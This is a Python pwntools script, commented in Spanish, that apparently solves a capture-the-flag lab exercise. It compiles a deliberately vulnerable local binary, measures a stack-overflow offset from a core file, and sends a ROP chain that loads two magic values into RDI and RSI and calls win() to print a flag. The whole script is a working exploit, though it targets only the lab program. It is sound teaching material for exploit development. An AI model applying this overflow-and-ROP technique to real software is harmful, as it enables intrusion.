#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""C3 - win(int, int): DOS valores magicos por RDI y RSI.
Los gadgets VIENEN EMBEBIDOS en el binario (g_pop_rdi, g_pop_rsi,
g_ret): el patron que usan los autores de retos cuando el binario
dinamico moderno no trae trampolines propios. Se leen por SIMBOLO
(elf.symbols['g_pop_rdi']), nunca por direccion copiada.
Sin setarch: No PIE fija simbolos y gadgets aunque ASLR este activa.
USO: python3 c3_win2args.py"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = './c3_win2args'
MAGIC_RDI = 0xdeadbeef
MAGIC_RSI = 0xc0ffee00

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'c3_win2args.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)

# Gadgets embebidos, leidos por SIMBOLO (comprobado con ROPgadget:
#   ROPgadget --binary ./c3_win2args --only "pop|ret")
pop_rdi = elf.symbols['g_pop_rdi']
pop_rsi = elf.symbols['g_pop_rsi']
ret_g = elf.symbols['g_ret']
win = elf.symbols['win']
log.info('g_pop_rdi = %#x | g_pop_rsi = %#x | g_ret = %#x (No PIE: fijos)',
         pop_rdi, pop_rsi, ret_g)
log.info('win()      = %#x', win)

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'en ejecucion')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - cadena de DOS argumentos con gadgets embebidos:
#   [g_pop_rdi][0xdeadbeef][g_pop_rsi][0xc0ffee00][g_ret][win]
#   Control: si RDI llega mal, win() imprime los argumentos recibidos.
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'en ejecucion')
payload = (b'A' * offset
           + p64(pop_rdi)
           + p64(MAGIC_RDI)
           + p64(pop_rsi)
           + p64(MAGIC_RSI)
           + p64(ret_g)          # alineacion para printf dentro de win()
           + p64(win))
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

FLAG = b'FLAG{ROP_C3_dos_valores_magicos}'
if FLAG in salida:
    log.success('C3 SUPERADO: dos registros cargados en orden System V '
                '(RDI primero, RSI despues).')
else:
    log.failure('C3: sin flag. Pistas: gadgets por simbolo, valores '
                '0xdeadbeef/0xc0ffee00, ret de alineacion antes de win().')
